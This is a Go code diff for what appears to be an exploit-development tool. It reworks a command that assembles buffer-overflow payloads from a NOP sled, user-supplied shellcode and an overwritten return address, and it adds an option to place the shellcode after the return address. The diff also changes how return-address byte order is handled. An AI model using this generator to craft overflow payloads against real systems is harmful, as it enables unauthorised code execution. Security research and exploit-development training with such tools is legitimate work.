@@ -4,7 +4,7 @@ import (
 	"fmt"
 
 	"github.com/hashibuto/artillery"
-	"github.com/hashibuto/shellfire/internal/utils"
+	"github.com/hashibuto/shellfire/internal/buffer"
 )
 
 var malformedHexStringErr = fmt.Errorf("Malformed hex string, should take the following form \\xed\\x32\\x44\\x55")
@@ -28,6 +28,13 @@ var PayloadCommand = &artillery.Command{
 		},
 	},
 	Options: []*artillery.Option{
+		{
+			Name:        "append",
+			ShortName:   'a',
+			Description: "append shellcode after return address",
+			Type:        artillery.Bool,
+			Value:       true,
+		},
 		{
 			Name:        "nsb",
 			ShortName:   'n',
@@ -55,6 +62,7 @@ var PayloadCommand = &artillery.Command{
 // makePayload generates a buffer payload containingthe provided shellcode
 func makePayload(n artillery.Namespace, p *artillery.Processor) error {
 	var args struct {
+		Append        bool
 		Big           bool
 		Hex           bool
 		Nsb           int
@@ -81,53 +89,38 @@ func makePayload(n artillery.Namespace, p *artillery.Processor) error {
 		return fmt.Errorf("Nopsled is too long for the provided buffer")
 	}
 
-	buffer := make([]byte, args.Offset+len(returnAddressBytes))
-
-	remaining := args.Offset - len(shellcodeBytes)
-	nops := args.Nsb
-	if nops == 0 {
-		if remaining%2 != 0 {
-			nops = int(remaining/2) + 1
-
-		} else {
-			nops = int(remaining / 2)
-		}
-	}
-	padding := args.Offset - len(shellcodeBytes) - nops
-
-	offset := 0
-	for i := 0; i < nops; i++ {
-		buffer[offset] = 0x90
-		offset++
-	}
-	for i := 0; i < len(shellcodeBytes); i++ {
-		buffer[offset] = shellcodeBytes[i]
-		offset++
-	}
-	for i := 0; i < padding; i++ {
-		buffer[offset] = 0x90 // pad with nop.... why nop...
-		offset++
+	endOfReturn := args.Offset + len(returnAddressBytes)
+	totalSize := endOfReturn
+	if args.Append {
+		totalSize += len(shellcodeBytes)
 	}
 
-	if args.Big {
-		for i := 0; i < len(returnAddressBytes); i++ {
-			buffer[offset] = returnAddressBytes[i]
-			offset++
-		}
+	// Init with NOP
+	b := buffer.NewBuffer(totalSize, 0x90)
+
+	var offset int
+	if args.Append {
+		offset = endOfReturn
 	} else {
-		for i := len(returnAddressBytes) - 1; i >= 0; i-- {
-			buffer[offset] = returnAddressBytes[i]
-			offset++
+		if args.Nsb > 0 {
+			offset = args.Nsb
+		} else {
+			offset = int((args.Offset - len(shellcodeBytes)) / 2)
 		}
 	}
 
-	for i := 0; i < len(buffer); i++ {
-		if buffer[i] == 0 {
-			return fmt.Errorf("Buffer contains a null character")
-		}
+	b.CopyTo(shellcodeBytes, offset)
+	if args.Big {
+		b.RevCopyTo(returnAddressBytes, args.Offset)
+	} else {
+		b.CopyTo(returnAddressBytes, args.Offset)
 	}
 
-	utils.Write(buffer, args.Hex)
+	err = b.Validate()
+	if err != nil {
+		return err
+	}
+	b.Stdout(args.Hex)
 	return nil
 }
 
